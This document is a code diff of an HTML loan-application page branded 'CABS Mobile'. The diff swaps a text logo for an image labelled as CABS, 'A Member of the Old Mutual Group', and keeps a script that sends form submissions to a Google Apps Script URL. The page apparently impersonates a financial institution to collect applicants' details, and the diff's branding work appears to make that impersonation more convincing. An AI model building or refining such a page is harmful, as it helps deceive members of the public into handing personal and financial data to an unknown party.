@@ -29,28 +29,26 @@
       box-shadow: 0 8px 24px rgba(0, 40, 80, 0.12);
     }
 
-    /* Header */
+    /* Header with Logo */
     .header {
-      background: #1a3a6b;
-      padding: 28px 24px 22px;
+      background: #ffffff;
+      padding: 24px 20px 18px;
       text-align: center;
-      color: white;
+      border-bottom: 3px solid #1a3a6b;
     }
 
-    .logo {
-      font-size: 28px;
-      font-weight: 700;
-      letter-spacing: 0.5px;
-    }
-
-    .logo span {
-      color: #7ec8e3;
+    .header img {
+      max-width: 220px;
+      width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto;
     }
 
     .tagline {
       font-size: 13px;
-      opacity: 0.9;
-      margin-top: 6px;
+      color: #5a6a7a;
+      margin-top: 10px;
     }
 
     /* Content */
@@ -97,11 +95,6 @@
       font-weight: 800;
       color: #1a3a6b;
       margin: 12px 0 18px;
-    }
-
-    .amount span {
-      font-size: 22px;
-      font-weight: 600;
     }
 
     input[type="range"] {
@@ -234,9 +227,9 @@
 <body>
 
   <div class="card">
-    <!-- Header -->
+    <!-- Header with Logo -->
     <div class="header">
-      <div class="logo">CABS <span>Mobile</span></div>
+      <img src="cabs-logo.png" alt="CABS - A Member of the Old Mutual Group">
       <p class="tagline">Fast Approval • Flexible Repayment • Trusted & Secure</p>
     </div>
 
@@ -355,7 +348,6 @@
     const messageEl = document.getElementById("message");
     const submitBtn = document.getElementById("submitBtn");
 
-    // Your Google Apps Script URL
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-v1eYH1jsEfDuSbXG1Blkv9pl9AqdqIJ_llVwHkKGDwVHsStxI66vhoPQh2jZBb9t9w/exec";
 
     form.addEventListener("submit", async function (e) {
